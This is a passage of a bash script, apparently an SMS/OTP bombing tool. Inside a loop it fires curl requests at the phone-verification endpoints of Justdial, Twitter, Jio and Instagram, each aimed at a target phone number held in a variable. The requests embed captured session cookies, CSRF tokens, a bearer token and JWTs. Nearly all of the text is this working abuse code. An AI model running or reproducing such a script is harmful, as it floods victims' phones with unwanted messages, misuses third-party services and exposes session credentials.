  -H 'user-agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'origin: https://www.justdial.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.justdial.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: ppc=; TKY=0ff5613d081edc753d8ac0cfbf01adfd454a1c18fbf3275b676f4bc8625a6c0c; _ctok=1fbbcc4ff86b43031a3705caed0c3285109828c67634b038fa3cddce7cc05b70; main_city=Gandhinagar-Gujarat; akcty=Gandhinagar-Gujarat; inweb_city=Gandhinagar-Gujarat; attn_user=logout; PHPSESSID=d0a3f9912ac5dc038ea065049e223a5d; profbd=0; bdcheck=1; bm_sz=19778593BA84B1D8ECBBAFF30535F031~YAAQ9oosMUcctdx4AQAA3jphOAuJIMA6PuGPYYootWC+EjIhrdi7+LVmvgMasr36QbYWC/YYpVDnIZHxMinWd2+zuNY53s6KZhrVcGWsN6RomS0tVJt9JXpBNDMK0LJaQSWa9yzJcXAOBHMDKQbKR2aiYZvXDwodyqSVQR/M5DWbc53X1vYtvReN4ATg5zxmtw==; _ga=GA1.2.1051062779.1620148567; _gid=GA1.2.1268876550.1620148567; _gat=1; _gat_category=1; _gat_UA-31027791-3=1; _fbp=fb.1.1620148567924.499452454; ak_bmsc=5C1DF23F43AA6A6352F132EF3376C474312C8AF6876800005681916074841C16~plt53vc41OutD+XRVZby4QZvmz+xtIEz23VmlrnIM9F+aNLCBZa9pi9ysejBJ8EdtbYZvYD6DU0mTgdbE9N9uw5u1jhjo0mzqErN5DfoyexzqKdv9Y+cntsNsJvX5CLZEYW+OweqanRgEJkwBwHWtPYrC4BCJvc6zuQ/z4x0ntP3Ex0cKtWZ8jLLBF4K/QxD24MqE2tUC1So7/wjMbKBtXcrNB3mQAFP5H3uJJorXrJbqqxzMyMZVaD8+HmcKCI6cMJOdCivpqMOw1D081ZeN5tQ==; _abck=CD5B030736476EE83DCE3B119C36A139~0~YAAQ9oosMU4ctdx4AQAAzD9hOAVwHJ/shny7h7vCoa8r+52Frps58D3a/vgwkMCbHGBiVYoFERfE/clobEopNLz4NIylVwjbYCoa7NFjTwfl1x/ZUbQ2nuiXTWuTjogKln8/2bubnIM1wrGFV+phwoda6aDiqAhi3RC/7lVXXZRRIhCgTrp/apOGcLsyDk7sYNZoFNGZCnEXiU/rQq72ltxMcRT1IfgIu9nMjLCmMWImZZu0yX46ZjZFW/M58GWB9sPZOJW+0Ccyoeempxj/S1KSYc0uJuIxNcaBReb8jwhb8LK8CLMzcoX3V6kgaLwLCfcRX+hjoxa7WZF80CipjOoXWg6XUkC9gT6To2JM2E9OJ23oj/4+2uyNzbEjcRrDkAY0FLCk+wXuE1DM4uOGU0dws254nowAZA==~-1~||-1||~-1; tab=toprs; BDprofile=0; prevcatid=11131975; bd_inputs=2|4|Wifi%20Internet%20Service%20Providers; view=lst_v; scity=Gandhinagar-Gujarat; sarea=; dealBackCity=Gandhinagar-Gujarat; ppc=; bm_sv=4984BB0CD07E831FB499723279497763~qWrAS/VBt6UOGt+yFhI7S5rfNWhGQFV+VX5XVJEn3A0AefFFezLAXHOQUj7CDVXxY8tC4WCa8cVQNL6JWI+zQBSA1Jj7xMbneRwU4YidSYAibYI5q21euT65t58dgu8qWZ+uj8zIT/1CsOKtShJ0dxDz1C4Mv46G2gPCdbLQdi4=' \
  --data-raw 'mob='$m4u'&vcode=&rsend=0&name=jvbfhvbhbvhbj' \
  --compressed
#<∅>03</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://twitter.com/i/api/1.1/onboarding/begin_verification.json' \
  -H 'authority: twitter.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'x-twitter-client-language: en' \
  -H 'x-csrf-token: d97d4eefa1df066685020223d73d9605' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'x-guest-token: 1389625812425445384' \
  -H 'x-twitter-active-user: yes' \
  -H 'origin: https://twitter.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://twitter.com/i/flow/signup' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: personalization_id="v1_tov7GesUUOONag5R9jgsBQ=="; guest_id=v1%3A162014758288810186; ct0=d97d4eefa1df066685020223d73d9605; _sl=1; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCM9EUjh5AToMY3NyZl9p%250AZCIlNmYyMWM1ZTQ4NmM1ZjYzMDM5ZTI3MzRhNGVmNWY3YWE6B2lkIiU0MWY2%250ANTY3NmE0MGE5MmY0YjZiMTdiZmVmMjQxOGZlNw%253D%253D--70e5b43ac35a873bff04b793d9dc6d07011f4371; gt=1389625812425445384; _ga=GA1.2.1159174491.1620147588; _gid=GA1.2.1712349650.1620147588' \
  --data-raw '{"phone":"'$m4u'","use_voice":false,"send_auto_verify_hash":false,"flow_token":"g;162014758288810186:-1620147621403:fCJzeUJvWqRY7P01zD4HoXPW:0"}' \
  --compressed
#<∅>02</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.jio.com/JioWebService/rest/loginService/sendOtp' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Pragma: no-cache' \
  -H 'Accept-Language: en' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Cache-Control: no-cache' \
  -H 'Origin: https://www.jio.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://www.jio.com/dashboard/?root=login' \
  -H $'Cookie: _ga=GA1.2.7523642.1619951643; NSC_q6.kjp.dpn_dmvtufs_WT.0*443=ffffffff0985009545525d5f4f58455e445a4a422828; next-i18next=en; _gid=GA1.2.195758944.1620140797; SS_X_JSESSIONID=YCY38X621Q35SmJg2AFeaAmnS3Y-Ntitz0fdTQuUsZ4vQiraMd1s\u0021-197662304; NSC_Joufsobm_QPE2_tfmgdbsf*7777=ffffffff0985063945525d5f4f58455e445a4a42284a; language_info=en_US; ssjsid=70a019be-7425-499f-9d9e-fee59208822d; JioSessionID=70a019be-7425-499f-9d9e-fee59208822d; NSC_q2.kjp.dpn_dmvtufs_WT.0*443=ffffffff09851f1f45525d5f4f58455e445a4a422825; NSC_q1.kjp.dpn_dmvtufs_WT.0*443=ffffffff09851f1a45525d5f4f58455e445a4a422825; NSC_q1.kjp.dpn_bqj.0_WT*443=ffffffff09851f1a45525d5f4f58455e445a4a4229a0; _dc_gtm_UA-56816637-12=1; _fbp=fb.1.1620144346483.279287614; _gat_UA-56816637-12=1; JSESSIONID=ljM4IN5I6LI3HF51vh3Up75RsQb7H0cohpls8GIPCkR6G708OVTt\u0021-1915481589; _gali=jio-ui-id-27%7Cinput; Authorization=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJKSU8uQ09NIiwic3ViIjoiNzBhMDE5YmUtNzQyNS00OTlmLTlkOWUtZmVlNTkyMDg4MjJkIiwiaWF0IjoxNjIwMTQ0MzU5LCJleHAiOjE2MjAxNDUyNTl9.TBrRP4oySHv9zaKsS4SMIIpSBE-8TRPxVN_6hmtjJT0; ssaid=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJKSU8uQ09NIiwic3ViIjoiNzBhMDE5YmUtNzQyNS00OTlmLTlkOWUtZmVlNTkyMDg4MjJkIiwiaWF0IjoxNjIwMTQ0MzU5LCJleHAiOjE2MjAxNDUyNTl9.TBrRP4oySHv9zaKsS4SMIIpSBE-8TRPxVN_6hmtjJT0' \
  --data-raw '{"mobileNumber":"'$m4u'","loginFlowType":"MOBILE","alternateNumber":""}' \
  --compressed
#<∅>01</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.instagram.com/accounts/send_signup_sms_code_ajax/' \
  -H 'authority: www.instagram.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'x-ig-www-claim: 0' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'x-instagram-ajax: 5916bd277576' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'x-csrftoken: rkmPy40XgpQgab3NzEOOGUZo7eOAvuHB' \
  -H 'x-ig-app-id: 936619743392459' \
  -H 'origin: https://www.instagram.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.instagram.com/accounts/emailsignup/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: csrftoken=rkmPy40XgpQgab3NzEOOGUZo7eOAvuHB; mid=YJF5VQAEAAGggp6A7q-d0t409pkW; ig_did=E6E0FBDB-E085-4639-AF78-D30077885234; ig_nrcb=1' \
  --data-raw 'client_id=YJF5VQAEAAGggp6A7q-d0t409pkW&phone_number=91'$m4u'&phone_id=&big_blue_token=' \
  --compressed
#<∅>0</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
done